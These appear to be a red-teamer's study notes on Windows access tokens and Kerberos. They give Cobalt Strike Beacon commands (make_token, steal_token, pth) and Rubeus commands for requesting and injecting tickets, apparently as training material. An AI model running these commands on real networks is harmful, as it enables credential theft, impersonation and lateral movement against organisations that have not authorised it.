Logon sessions Hold
- unique logon identifier (luid)
- username & Security Identifier (SID)
- Authentication package to auththe user
- logon time
- logon server (ex. DC) used
- DNS domain name & User Principal Name (UPN)

When logon session created the auth package passess information to the Local Security Authority (LSA)  which is used to create the access token for the user.

Access Tokens contains:

contains security information associated with the logon session (user)
- Unique token id
- ID of the parent Logon Session (labelled Authentication ID)
- Token type (primary or impersonation)
- User SID
- SIDs of any domain groups the user is a member of
- list of privs the user has (ex user right assignment)
- Token intergrity level (low, med, high, system)

Every process that starts with a logon will recieve a primary token and all actions performed will be under that idenity of the user

TOKEN Impersonation (Does not need HIGH integrity)

if a adversary knows the victims plaintext credentialsor if they can be stolen from a process. A adversary can create a new token.

- APIS
-- LogonUserA
-- ImpersonateLoggedOnUser

In Beacon we use make_token command
beacon> make_token domain_name\victim Passw0rd!
[+] Impersonated Domain_name\victim (netonly) <-- Netonly does have limitations (learned in specterops class): will work only on network not local. .

Steal Token (requires high -integrity session)
adversary steal primary token from a process running as a different user

- APIS
-- OpenProcess
-- OpenProcessToken
-- DuplicateToken
-- ImpersonateLoggedOnUser

In Beacon we can use steal_token
- Identify target with ps command
- steal_token 5248 <-- process ID

RevertToSelf

instructs beacon to stop impersonating

- APIS
-- ReverToSelf
Beacon rev2self

Token Store

to avoid loosing a token if a process is stopped can use token-store
- token-store steal PID will steal teh token and it to the store
- token-store show shows what is stored 
- token-store use # to use a token
- token-store delete to remove a token from store

Pass The Hash (PTH)

allows adversary to leverage NTLM hash to impersonate a user. However NTLM is dieing and is more likely not found.

Beacon pth donain\user hash 
- wrapper for sekurlsa::pth

Pass the ticket (PTT)

Requesting Ticket Granting Ticket (TGT)
-Adversary can request a TGT if they have the ntlm hash or the  aes encryption key. Using the NTLM generates a RC4 and is not good opsec

Rubeus asktgt: will return ticket in base64
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap

Injecting the ticket

Use powershell to save to ticket to local machine:

powershell $ticket = "doIF...."[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String($ticket))

kerberos_ticket_use <-- appply ticket to current seesion after it is saved with above command.

To avoid causing issues to actual user we can create a token with a fake passsword and assign the ticket to it

klist <-- to see current user info

make_token doman\user FakePass <-- replace domain and user
kerberos_ticket_use <-- assign a ticket to the new impersonated user
kerberos_ticket_use C:\Users\Attacker\Desktop\user.kirbi

kerberos_ticket_use <-- ISSUES will only import TGT and not Service Ticket and second it relies on the kirbi to be saved on the attack disk.

Injecting with Rubeus 

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:[luid] /ticket:[ticket]
- The command can take a base64 encoded ticket or the path to a kirbi, with this the kirbi is on the beacon disk not attacker disk.

Instead of using make_token we can use createnetonly <-- spawns a hidden process and returns the luid and PID

STEPS
- execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:user_name /domain:domaim_tld /password:FakePass
- execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x132ef34 /ticket:doIFoDCCBZygAwIBBaE...... <-- we get this from the asktgt
- steal_token #PID from the 1st step
Clean up
rev2self
kill






